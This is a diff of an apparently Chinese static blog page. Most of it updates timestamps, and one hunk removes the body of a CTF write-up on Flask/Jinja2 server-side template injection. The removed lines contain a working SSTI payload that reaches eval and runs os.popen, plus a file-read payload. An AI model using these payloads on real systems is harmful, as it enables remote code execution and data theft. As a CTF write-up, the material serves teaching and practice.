@@ -237,7 +237,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -277,23 +277,14 @@
 
       
           <h1 id="0x00-题目描述"><a href="#0x00-题目描述" class="headerlink" title="0x00 - 题目描述"></a>0x00 - 题目描述</h1><p><img src="http://markdown.yeek.top/20200118132746.png" alt=""></p>
-<h1 id="0x01-解题过程"><a href="#0x01-解题过程" class="headerlink" title="0x01 - 解题过程"></a>0x01 - 解题过程</h1><p>打开是单一网页，注释中也没有其他提示。</p>
-<p><img src="http://markdown.yeek.top/20200118132924.png" alt=""></p>
-<p>通过百度得知，是要利用 flask 模板的代码注入漏洞。就例如下面这种</p>
-<p><img src="http://markdown.yeek.top/20200118133342.png" alt=""></p>
-<p>这是某大神已经写好的远程执行漏洞，在popen里填入指令就行了。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c in [].<span class="keyword">__class__</span>.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% <span class="keyword">if</span> c.__name__ == <span class="string">'catch_warnings'</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">for</span> b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% <span class="keyword">if</span> b.<span class="keyword">__class__</span> == &#123;&#125;.<span class="keyword">__class__</span> %&#125;</span><br><span class="line">    &#123;% <span class="keyword">if</span> <span class="string">'eval'</span> in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[<span class="string">'eval'</span>](<span class="string">'__import__("os").popen("ls").read()'</span>) &#125;&#125;</span><br><span class="line">    &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">  &#123;% <span class="keyword">endfor</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endif</span> %&#125;</span><br><span class="line">&#123;% <span class="keyword">endfor</span> %&#125;</span><br></pre></td></tr></table></figure>
-
-<p>效果如下</p>
-<p><img src="http://markdown.yeek.top/20200118133907.png" alt=""></p>
-<p><img src="http://markdown.yeek.top/20200118133951.png" alt=""></p>
-<h1 id="0x02-技术总结"><a href="#0x02-技术总结" class="headerlink" title="0x02 - 技术总结"></a>0x02 - 技术总结</h1><p>这道题属于 <strong>SSTI——服务端模板注入攻击</strong> ，其实在 <code>Chrome</code> 的 <code>Hackbar</code> 中有测试载荷。</p>
-<p><strong>SSTI</strong> 读取文载荷</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[].__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'fl4g'</span>).read()</span><br></pre></td></tr></table></figure>
-
-
-
-
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/post/57753.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -343,7 +334,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -441,7 +432,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -544,7 +535,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -641,7 +632,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -745,7 +736,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -841,7 +832,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -942,7 +933,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1041,7 +1032,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1138,7 +1129,7 @@
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-02-09 02:08:50" itemprop="dateModified" datetime="2020-02-09T02:08:50+08:00">2020-02-09</time>
+                <time title="修改时间：2020-02-09 02:24:40" itemprop="dateModified" datetime="2020-02-09T02:24:40+08:00">2020-02-09</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
